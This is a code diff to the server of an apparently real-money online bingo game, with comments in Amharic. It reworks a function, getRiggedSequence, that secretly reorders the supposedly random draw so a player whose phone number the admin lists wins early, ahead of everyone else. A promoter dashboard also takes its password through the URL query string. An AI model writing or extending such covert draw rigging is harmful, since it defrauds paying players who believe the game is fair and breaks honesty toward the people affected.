@@ -80,8 +80,6 @@ const SystemSettings = mongoose.model('SystemSettings', new mongoose.Schema({
     registerBonus: { type: Number, default: 10 }, inviteBonus: { type: Number, default: 10 }, adminProfitPercent: { type: Number, default: 15 },
     maxTicketsPerUser: { type: Number, default: 4 },
     minWithdrawLimit: { type: Number, default: 50 },
-    
-    // 🔥 አዳዲሶቹ ማስተካከያዎች (Timers & Forced Phone Numbers) 🔥
     winPopupTimer: { type: Number, default: 12 },
     forcedWinnerPhones: { type: String, default: "" }
 }));
@@ -102,8 +100,6 @@ async function loadSettings() {
         registerBonus: s.registerBonus !== undefined ? s.registerBonus : 10, inviteBonus: s.inviteBonus !== undefined ? s.inviteBonus : 10,
         adminProfitPercent: s.adminProfitPercent !== undefined ? s.adminProfitPercent : 15, maxTicketsPerUser: s.maxTicketsPerUser !== undefined ? s.maxTicketsPerUser : 4,
         minWithdrawLimit: s.minWithdrawLimit !== undefined ? s.minWithdrawLimit : 50,
-        
-        // 🔥 አዳዲሶቹ ማስተካከያዎች
         winPopupTimer: s.winPopupTimer !== undefined ? s.winPopupTimer : 12,
         forcedWinnerPhones: s.forcedWinnerPhones || ""
     };
@@ -969,62 +965,64 @@ function serverCheckBingo(grid, called) {
     return false;
 }
 
-// 🔥 ጌሙን (ቁጥሩን) የመቆጣጠሪያ ሲስተም (Forced Winning Logic) 🔥
+// 🔥 ጌሙን (አሸናፊውን) የመቆጣጠሪያ ሲስተም (Forced Winning Logic) 🔥
 function getRiggedSequence(baseSequence) {
-    let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim());
-    let targetPlayer = null;
-    let targetTicket = null;
+    if (!GLOBAL_SETTINGS.forcedWinnerPhones || GLOBAL_SETTINGS.forcedWinnerPhones.trim() === "") {
+        return baseSequence; 
+    }
 
-    // አድሚኑ ካስገባቸው ስልኮች ውስጥ በዚህ ዙር የሚጫወት ሰው ካለ ፈልግ
+    let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim());
+    let activeRiggedPlayers = [];
+
+    // አድሚን ካስገባቸው ስልኮች ውስጥ በዚህ ዙር የተጫወተ ካለ ፈልግ
     for (let p of riggedPhones) {
         if (activePlayers[p]) {
-            targetPlayer = activePlayers[p];
-            // የመጀመሪያውን ካርቴላውን እንዲያሸንፍ እንመርጣለን
-            targetTicket = targetPlayer.ticketsData[0];
-            break;
+            activeRiggedPlayers.push(activePlayers[p]);
         }
     }
 
-    if (targetTicket) {
-        // የ3ኛውን (Horizontal) መስመር አሸናፊ እናደርገዋለን፣ ምክንያቱም FREE ስፔስ አለው (4 ቁጥር ብቻ ነው ሚፈልገው)
-        let neededNumbers = [
-            targetTicket.grid[0][2],
-            targetTicket.grid[1][2],
-            targetTicket.grid[3][2],
-            targetTicket.grid[4][2]
-        ];
+    // ካስገባቸው ውስጥ ማንም ካልተጫወተ ኖርማል ዕጣ ይሆናል
+    if (activeRiggedPlayers.length === 0) {
+        return baseSequence;
+    }
 
-        // ከዋናው ዕጣ ውስጥ እነዚህን አውጣ
-        let pool = baseSequence.filter(n => !neededNumbers.includes(n));
-        
-        let finalSequence = [];
-        let winIndex = 0;
+    // ከተጫወቱት ውስጥ አንዱን በዕጣ አሸናፊ እናደርጋለን
+    let targetPlayer = activeRiggedPlayers[Math.floor(Math.random() * activeRiggedPlayers.length)];
+    let targetTicket = targetPlayer.ticketsData[Math.floor(Math.random() * targetPlayer.ticketsData.length)];
 
-        // አሸናፊው ቶሎ (በ30ኛው ዕጣ አካባቢ) እንዲያሸንፍና ማንም እንዳይቀድመው የተመረጡትን ቁጥሮች እናስገባለን
-        for(let i=0; i<75; i++) {
-            if ((i === 8 || i === 15 || i === 22 || i === 28) && winIndex < 4) {
-                finalSequence.push(neededNumbers[winIndex]);
-                winIndex++;
-            } else if (pool.length > 0) {
-                finalSequence.push(pool.shift());
-            }
+    // በመሀል በኩል አሸናፊ እናደርገዋለን (ምክንያቱም FREE ስላለው የሚያስፈልገው 4 ቁጥር ብቻ ነው)
+    let neededNumbers = [
+        targetTicket.grid[0][2],
+        targetTicket.grid[1][2],
+        targetTicket.grid[3][2],
+        targetTicket.grid[4][2]
+    ];
+
+    // እነዚህን 4 ቁጥሮች ከኖርማሉ ዕጣ ውስጥ እናወጣቸዋለን
+    let pool = baseSequence.filter(n => !neededNumbers.includes(n));
+    
+    let finalSequence = [];
+    let winIndex = 0;
+
+    // አሸናፊው ቶሎ (በ25ኛው ዕጣ አካባቢ) እንዲያሸንፍና ማንም እንዳይቀድመው እናደርጋለን
+    let winPositions = [8, 15, 20, 25]; 
+
+    for(let i=1; i<=75; i++) {
+        if (winPositions.includes(i) && winIndex < 4) {
+            finalSequence.push(neededNumbers[winIndex]);
+            winIndex++;
+        } else if (pool.length > 0) {
+            finalSequence.push(pool.shift());
         }
-        console.log("🔥 GAME RIGGED FOR:", targetPlayer.phone);
-        return finalSequence;
     }
     
-    // ማንም የተመረጠ ሰው ካልተጫወተ ኖርማል (Random) ሆኖ ይወጣል
-    return baseSequence;
+    console.log("🔥 GAME RIGGED FOR:", targetPlayer.phone);
+    return finalSequence;
 }
 
 function generateDrawSequence() {
     let pool = Array.from({length: 75}, (_, i) => i + 1).sort(() => Math.random() - 0.5);
-    
-    // አድሚን ስልክ ካስገባ ጌሙን ኮንትሮል እንዲያደርግ እንጠይቀዋለን
-    if (GLOBAL_SETTINGS.forcedWinnerPhones && GLOBAL_SETTINGS.forcedWinnerPhones.trim() !== "") {
-        return getRiggedSequence(pool);
-    }
-    return pool; 
+    return getRiggedSequence(pool); 
 }
 
 async function declareWinners(winners) {
@@ -1754,7 +1752,6 @@ app.get('/guide', (req, res) => {
     res.send(html);
 });
 
-// 🔥 PROMOTER WEB DASHBOARD 🔥
 app.get('/promoter', async (req, res) => {
     let phone = req.query.phone;
     let pass = req.query.pass;
